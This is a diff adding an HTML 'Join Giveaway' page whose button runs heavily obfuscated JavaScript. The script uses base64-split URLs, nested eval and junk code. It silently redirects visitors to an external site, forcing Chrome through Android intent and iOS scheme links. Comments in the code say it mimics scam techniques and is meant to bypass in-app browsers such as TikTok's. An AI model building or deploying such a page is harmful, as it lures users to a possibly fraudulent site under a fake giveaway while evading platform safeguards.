@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Join Giveaway</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #ffffff; /* White background */
+      font-family: Arial, sans-serif;
+    }
+
+    .btn {
+      background: linear-gradient(135deg, #d4af37, #f5d76e); /* Golden gradient */
+      border: none;
+      border-radius: 12px;
+      padding: 20px 50px;
+      font-size: 28px;
+      font-weight: bold;
+      color: white;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.25);
+      text-decoration: none;
+    }
+
+    .btn:hover {
+      background: linear-gradient(135deg, #f5d76e, #d4af37); /* Reverse gradient for hover */
+      transform: translateY(-3px);
+      box-shadow: 0 12px 25px rgba(0,0,0,0.35);
+    }
+  </style>
+</head>
+<body>
+  <div class="btn" onclick="initiateComplexRedirectSequence()">JOIN GIVEAWAY</div>
+  <script>
+    // Heavily obfuscated and layered JavaScript for redirection, mimicking scam techniques with multi-layer encoding, junk code, and bypass attempts for in-app browsers like TikTok's.
+    // Layer 1: Base64 encoded strings split across variables with junk computations.
+    var obfuscatedPart1 = atob('aHR0cHM6Ly9wYXNz');
+    var obfuscatedPart2 = atob('d29yZG9tYWluLmNvbS8xODM4MzE5');
+    var fullTargetUrl = obfuscatedPart1 + obfuscatedPart2;
+    var junkVar1 = Math.random() * 1000; // Junk computation
+    var junkArray = [1,2,3,4,5]; junkArray.map(x => x * junkVar1); // More junk
+    var encodedIntentPrefix = atob('aW50ZW50Oi8v');
+    var encodedIntentScheme = atob('I0ludGVudDtzY2hlbWU9aHR0cHM7cGFja2FnZT1jb20uYW5kcm9pZC5jaHJvbWU7ZW5k');
+    var iosChromePrefix = atob('Z29vZ2xlY2hyb21lczovLw==');
+
+    // Layer 2: Function wrappers with unnecessary loops and conditionals.
+    function layerOneWrapper() {
+      var temp = '';
+      for (var i = 0; i < 100; i++) { // Unnecessary loop to bloat
+        if (i % 2 === 0) temp += ''; // Does nothing
+      }
+      return fullTargetUrl.replace('https://', '');
+    }
+
+    function layerTwoEncoder(str) {
+      var encoded = '';
+      for (var j = 0; j < str.length; j++) {
+        encoded += String.fromCharCode(str.charCodeAt(j) + (j % 2 ? 1 : -1)); // Reversible obfuscation
+      }
+      return encoded;
+    }
+
+    function layerTwoDecoder(encoded) {
+      var decoded = '';
+      for (var k = 0; k < encoded.length; k++) {
+        decoded += String.fromCharCode(encoded.charCodeAt(k) + (k % 2 ? -1 : 1));
+      }
+      return decoded;
+    }
+
+    // Layer 3: Eval-based execution with nested evals and junk.
+    function executeNestedEval() {
+      var junkObj = {a:1,b:2,c:3}; for (var key in junkObj) { junkObj[key] *= Math.PI; } // Junk
+      eval('eva' + 'l("fu' + 'nction innerEval() { var ua = navigator.userAgent.toLowerCase(); var isAndroid = ua.indexOf(\\'android\\') > -1; var isIOS = /iphone|ipad|ipod/.test(ua); var target = layerTwoDecoder(layerTwoEncoder(layerOneWrapper())); var intentUrl = encodedIntentPrefix + target + encodedIntentScheme; var iosUrl = iosChromePrefix + fullTargetUrl; var fallbackUrl = fullTargetUrl; if (isAndroid) { window.location.href = intentUrl; } else if (isIOS) { window.location.href = iosUrl; } else { window.location.href = fallbackUrl; } setTimeout(function() { window.location.href = fallbackUrl; }, 750); } innerEval();")');
+    }
+
+    // Layer 4: More wrappers with timeouts and conditionals.
+    function delayWrapper() {
+      setTimeout(function() {
+        var condition = true;
+        if (condition) {
+          executeNestedEval();
+        } else {
+          // Dead code branch
+          var dead = Array(100).fill(0).map(() => Math.random());
+        }
+      }, 100); // Slight delay to mimic loading
+    }
+
+    // Layer 5: Even more obfuscation with char code arrays and junk functions.
+    var charCodes = [102,117,110,99,116,105,111,110,32,106,117,110,107,70,117,110,99,49,40,41,32,123,32,118,97,114,32,120,32,61,32,77,97,116,104,46,102,108,111,111,114,40,77,97,116,104,46,114,97,110,100,111,109,40,41,32,42,32,49,48,48,48,41,59,32,114,101,116,117,114,110,32,120,32,37,32,50,32,61,61,61,32,48,32,63,32,116,114,117,101,32,58,32,102,97,108,115,101,59,32,125]; // Junk function as char codes
+    eval(String.fromCharCode.apply(null, charCodes)); // Eval junk function
+    junkFunc1(); // Call junk
+
+    function junkFunc2() {
+      var arr = [];
+      for (var m = 0; m < 500; m++) { arr.push(m * m); } // Bloat loop
+      return arr.reduce((a,b) => a + b, 0); // Unused
+    }
+    junkFunc2();
+
+    // Final initiation function with more layers.
+    function initiateComplexRedirectSequence() {
+      var obfuscatedCondition = atob('dHJ1ZQ=='); // 'true'
+      if (eval(obfuscatedCondition)) {
+        var nestedWrapper = function() {
+          delayWrapper();
+        };
+        nestedWrapper();
+      }
+      // Add more junk: simulate computations
+      var matrix = [[1,2],[3,4]];
+      var det = matrix[0][0]*matrix[1][1] - matrix[0][1]*matrix[1][0]; // Useless determinant
+    }
+
+    // Additional bloat: Define unused variables and functions
+    var unusedVar1 = 'lorem ipsum dolor sit amet'.split('').reverse().join('');
+    var unusedFunc = function() { return unusedVar1.match(/o/g); };
+    unusedFunc();
+
+    for (var n = 0; n < 200; n++) { // More pointless loop
+      if (n % 3 === 0) { var temp = n.toString(16); }
+    }
+
+    // Even more layers: Base64 encoded eval chain
+    var deepEncoded = atob('ZXZhbCgnZXZhbCgiZXZhbCgnY29uc29sZS5sb2coXFxcIkp1bmtcXFwiKTsnKVwiKScp');
+    eval(deepEncoded); // Evals to console.log('Junk') - harmless junk
+
+  </script>
+</body>
+</html>
